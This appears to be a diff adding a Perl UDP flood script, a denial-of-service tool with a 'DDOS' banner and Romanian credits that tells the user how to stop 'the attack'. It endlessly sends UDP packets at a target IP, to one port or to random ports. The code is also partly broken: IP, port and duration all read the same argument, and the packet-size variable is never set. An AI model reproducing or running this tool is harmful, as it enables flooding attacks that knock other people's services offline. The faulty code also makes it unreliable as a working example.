@@ -1,0 +1,55 @@
+﻿#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+my ($ip,$port,$size,$time);
+$ip=$ARGV[0];
+$port=$ARGV[0];
+$time=$ARGV[0];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+printf "[1;35m#[1;33m#[1;31m*[0;32m  
+  _____  _____   ____   _____ 
+ |  __ \|  __ \ / __ \ / ____|
+ | |  | | |  | | |  | | (___  
+ | |  | | |  | | |  | |\___ \ 
+ | |__| | |__| | |__| |____) |
+ |_____/|_____/ \____/|_____/ 
+  / ____|  ____/ __ \         
+ | |  __| |__ | |  | |        
+ | | |_ |  __|| |  | |        
+ | |__| | |___| |__| |        
+  \_____|______\____/   
+  
+  New Arhive by Geo
+  Caini latra Geo Flodeaza
+ Toata Dragostea mea pentru Bia
+ Pentru a opri atacul foloseste CLTR+C
+                                                                                                           
+ [1;36m$ip^[n";
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &"); 
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=(rand 65000) +1;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
